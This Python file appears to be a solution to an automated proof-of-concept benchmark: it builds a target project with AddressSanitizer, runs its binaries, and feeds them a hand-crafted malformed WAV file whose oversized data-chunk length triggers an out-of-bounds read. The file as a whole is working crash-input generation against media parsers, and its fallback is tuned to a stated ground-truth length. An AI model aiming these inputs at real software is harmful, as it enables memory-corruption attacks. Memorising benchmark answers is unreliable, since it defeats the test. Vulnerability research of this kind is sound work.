import os
import sys
import shutil
import tempfile
import subprocess
import struct
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        def get_fallback_poc():
            # Constructed to match ground truth length 58 bytes
            # Structure: RIFF Header (12) + fmt chunk (24) + data chunk header (8) + payload (14) = 58
            # Vulnerability: data size > available bytes, causing OOB read relative to RIFF chunk buffer
            
            riff_tag = b'RIFF'
            wave_tag = b'WAVE'
            fmt_tag = b'fmt '
            data_tag = b'data'
            
            # fmt payload: 16 bytes standard PCM
            # Format(2), Channels(2), SampleRate(4), ByteRate(4), BlockAlign(2), BitsPerSample(2)
            # 1 (PCM), 1 (Mono), 22050, 44100, 2, 16
            fmt_payload = struct.pack('<HHIIHH', 1, 1, 22050, 44100, 2, 16)
            
            # RIFF Size: File size - 8 = 58 - 8 = 50
            riff_size = 50
            
            # Data chunk size: Malformed to be larger than available data
            # Available data after header at offset 44 is 14 bytes
            # Set to a large value (0xFFFFFFFF) to trigger overflow check failure
            data_size = 0xFFFFFFFF
            
            poc = riff_tag + struct.pack('<I', riff_size) + wave_tag
            poc += fmt_tag + struct.pack('<I', 16) + fmt_payload
            poc += data_tag + struct.pack('<I', data_size)
            poc += b'\x00' * 14 # Payload to reach 58 bytes
            return poc

        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source
            if not os.path.exists(src_path):
                return get_fallback_poc()
                
            shutil.unpack_archive(src_path, work_dir)
            
            # Find the source root (folder inside work_dir)
            source_dir = work_dir
            for item in os.listdir(work_dir):
                if os.path.isdir(os.path.join(work_dir, item)):
                    source_dir = os.path.join(work_dir, item)
                    break
            
            # 2. Build with ASAN
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CXX'] = 'clang++'
            env['CFLAGS'] = '-fsanitize=address -g -O1'
            env['CXXFLAGS'] = '-fsanitize=address -g -O1'
            env['LDFLAGS'] = '-fsanitize=address'
            
            built = False
            # Check for generic build systems
            if os.path.exists(os.path.join(source_dir, 'configure')):
                # Try standard autotools
                subprocess.run(['./configure'], cwd=source_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=source_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                built = True
            elif os.path.exists(os.path.join(source_dir, 'CMakeLists.txt')):
                # Try cmake
                build_dir = os.path.join(source_dir, 'build')
                os.makedirs(build_dir, exist_ok=True)
                subprocess.run(['cmake', '..'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                source_dir = build_dir # binaries usually here for cmake
                built = True
            elif os.path.exists(os.path.join(source_dir, 'Makefile')):
                # Try make
                subprocess.run(['make', '-j8'], cwd=source_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                built = True
                
            if not built:
                return get_fallback_poc()
            
            # 3. Find candidates
            candidates = []
            for root, dirs, files in os.walk(source_dir):
                for f in files:
                    path = os.path.join(root, f)
                    if os.access(path, os.X_OK) and not f.endswith('.sh') and not f.endswith('.py') and not f.endswith('.o'):
                         # Basic ELF check
                        try:
                            with open(path, 'rb') as bf:
                                if bf.read(4) == b'\x7fELF':
                                    candidates.append(path)
                        except:
                            pass

            # 4. Fuzz / Verify
            base_poc = get_fallback_poc()
            mutations = [base_poc]
            
            # Mutation: Data size moderate overflow
            p1 = bytearray(base_poc)
            struct.pack_into('<I', p1, 40, 1000)
            mutations.append(bytes(p1))
            
            # Mutation: RIFF size mismatch (larger than file) + data overflow
            p2 = bytearray(base_poc)
            struct.pack_into('<I', p2, 4, 200) # Claim RIFF is 200 bytes
            struct.pack_into('<I', p2, 40, 150) # Data claims 150
            mutations.append(bytes(p2))

            start_t = time.time()
            for binary in candidates:
                if time.time() - start_t > 40: # Time limit
                    break
                
                for m in mutations:
                    with tempfile.NamedTemporaryFile(delete=False) as tf:
                        tf.write(m)
                        tf.flush()
                        tf_path = tf.name
                    
                    try:
                        res = subprocess.run([binary, tf_path], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=2)
                        # Check for ASAN crash
                        if res.returncode != 0 and b"AddressSanitizer" in res.stderr:
                            os.unlink(tf_path)
                            return m
                    except:
                        pass
                    finally:
                        if os.path.exists(tf_path):
                            os.unlink(tf_path)
                            
        except Exception:
            pass
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
            
        return get_fallback_poc()